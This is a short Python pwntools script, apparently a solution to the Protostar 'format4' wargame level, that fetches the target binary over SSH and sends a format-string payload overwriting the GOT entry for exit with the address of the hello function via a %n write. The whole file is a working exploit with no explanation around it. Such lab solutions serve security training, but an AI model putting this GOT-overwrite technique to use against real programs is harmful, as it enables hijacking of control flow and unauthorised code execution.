#!/usr/bin/python
from pwn import *
import os
from ssh import *

binarypath='/opt/protostar/bin/format4'
sh.download(binarypath)
elf=ELF('./format4')
p=sh.run(binarypath)

addr=elf.got['exit']
amt1=elf.symbols['hello']
# amt2=0x
# payload=p32(addr)+"%"+str(amt1-4)+"x"+"%12$n"
payload=p32(addr)+"%0"+str(amt1-4)+"x"+"%4$n"
p.sendline(payload)
p.recvuntil('\n')
print p.recvall()
os.system('rm format4')